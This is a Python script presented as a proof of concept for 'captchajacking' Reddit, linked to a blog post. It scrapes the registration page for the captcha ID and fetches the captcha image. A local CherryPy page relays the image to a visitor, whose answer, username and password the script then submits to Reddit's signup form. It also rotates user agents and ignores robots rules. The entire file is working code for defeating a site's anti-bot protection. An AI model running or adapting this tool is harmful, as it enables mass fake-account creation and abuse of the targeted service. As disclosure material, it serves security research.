from random import choice
import cherrypy
import requests
import re
import os.path
import cookielib
import urllib
import logging
import mechanize
from bs4 import BeautifulSoup
import cStringIO
## Mechanize Approach!
cj = cookielib.LWPCookieJar()
br = mechanize.Browser()
br.set_cookiejar(cj)
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
br.open("http://www.reddit.com/register")
for f in br.forms():
    print f
html_reg = br.response().read()
source_fixed1 = html_reg
cap_iden1 = re.compile(r'value="[A-Za-z0-9]{32}')
captchai1 = cap_iden1.search(source_fixed1)
cident_raw1 = captchai1.group()
cident1 = captchai1.group()
cident1 = cident1.replace("value=\"", "")
captchaname1 = "captchas/" + cident1 + ".png"
captchaurl1 = "http://reddit.com/captcha/{0}.png".format(cident1)
## Requests Approach ! didn't work!!
url = 'http://www.reddit.com/register'
ualist= [line.rstrip() for line in open('useragents.txt')]
headers = {'User-Agent': '{0}'.format(choice(ualist)),
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Referer': 'http://www.reddit.com/register',}
#cherrypy handling below
rsess = requests.Session()
regpage = rsess.get(url, headers=headers)
source = regpage.text
source_fixed = source.encode('ascii','ignore')
cap_iden = re.compile(r'value="[A-Za-z0-9]{32}')
captchai = cap_iden.search(source_fixed)
cident_raw = captchai.group()
cident = captchai.group()
cident = cident.replace("value=\"", "")
captchaname = "captchas/" + cident + ".png"
captchaurl = "http://reddit.com/captcha/{0}.png".format(cident)
class reddit_cjack:
	def index(self):
		with open(captchaname1, 'wb') as handle:
		    request = rsess.get(captchaurl1, headers=headers, stream=True)

		    for block in request.iter_content(1024):
		        if not block:
		            break

		        handle.write(block)
		return """<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta charset="utf-8" />
<title>Reddit Captcha Hijacking PoC</title>
<link rel="stylesheet" href="css/master.css" type="text/css" />
</head>
<body id="index">
        <div id="container">
            <div id="header"><h1>Captchajacking PoC - blog post <a href="http://blog.shubh.am/">here.</a></h1></div>
            <div id="main">
                <form action="execute" method="post">
                <table cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td class="form-input-name">Username</td>
                        <td class="input"><input type="username" name="username" placeholder="crash override" autocomplete="off" required="required" /></td>
                    </tr>
                    <tr>
                        <td class="form-input-name">Password</td>
                        <td class="input"><input type="password" name="passw" placeholder="gibsonhacker101" autocomplete="off" required="required" /></td>
                    </tr>
        
                    <tr>
                        <td class="form-input-name">Captcha</td>
                        <td class="input">""" + """<img src=""" + captchaname1 + """></img>""" + """<textarea name="captcha" rows="5" cols="29" placeholder="Captcha Text"></textarea></td>
                    </tr>
                    <tr>
                        <td class="form-input-name"></td>
                        <td><input type="submit" value="Register" /></td>
                    </tr>
                </table>
                </form>
            </div>
        </div>
</body>
</html>"""
	index.exposed = True
	def execute(self, username, passw, captcha):
		br.select_form(nr=0)
		br.form[ 'user' ] = username
		br.form[ 'passwd' ] = passw
		br.form[ 'passwd2' ] = passw
		br.form[ 'captcha' ] = captcha
		br.submit()
		# rposturl = "https://ssl.reddit.com/api/register/" + username
		# datapayload = {
		# 'op':'reg',
		# 'dest' : '%2F',
		# 'user' : username,
		# 'email' : '',
		# 'passwd' : passw,
		# 'passwd2' : passw,
		# 'iden' : cident_raw,
		# 'captcha' : captcha,
		# 'api_type' : 'json'
 	# 	}
		# regpost = rsess.post(rposturl, data=datapayload, headers=headers)
		# return regpost.text
	execute.exposed= True
PATH = os.path.abspath(os.path.dirname(__file__))
conf = {
        '/': {
                'tools.staticdir.on': True,
                'tools.staticdir.dir': PATH,
            },
    }
cherrypy.tree.mount(reddit_cjack(), "/", config=conf)
cherrypy.engine.start()
cherrypy.engine.block()